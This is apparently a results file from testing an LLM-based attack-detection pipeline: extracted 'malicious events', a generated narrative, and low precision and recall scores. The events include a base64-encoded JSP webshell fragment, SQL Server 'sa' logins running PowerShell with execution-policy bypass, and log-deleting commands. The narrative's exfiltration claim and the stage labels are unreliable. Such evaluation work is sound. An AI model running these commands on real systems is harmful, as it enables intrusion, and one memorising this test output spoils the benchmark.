@@ -1,0 +1,115 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWirUWU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo start:454b7093-cc6e-484e-9c42-e222c6906204",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "echo end:454b7093-cc6e-484e-9c42-e222c6906204",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "echo start:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "echo end:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "echo end:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sqltool_amd64_u --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C \\$, ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "ssh -D -R",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q c:\\windows\\logout.jsp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "timeout 600 python -m SimpleHTTPServer 8079",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec ''cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=', ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": ". ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec ''cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=', ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec ''cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=', ",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "The attackers appear to be using a series of tools to gain an initial foothold on the system through multiple methods such as downloading various binaries and executing scripts. They seem to have escalated privileges using SQL commands. After gaining access they sent stolen information back to their own servers. The method seems complex but it can be broken down into three phases: getting into the system, escalating the privilege level, and sending out the results.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 51663,
+      "completion_tokens": 2703,
+      "total_tokens": 54366,
+      "wall_clock_s": 16.906,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0625,
+      "recall": 0.14285714285714285,
+      "f1": 0.08695652173913043,
+      "tp": 1,
+      "fp": 15,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 16,
+      "fn": 7,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 51663,
+      "completion_tokens": 2703,
+      "total_tokens": 54366,
+      "wall_clock_s": 16.906,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
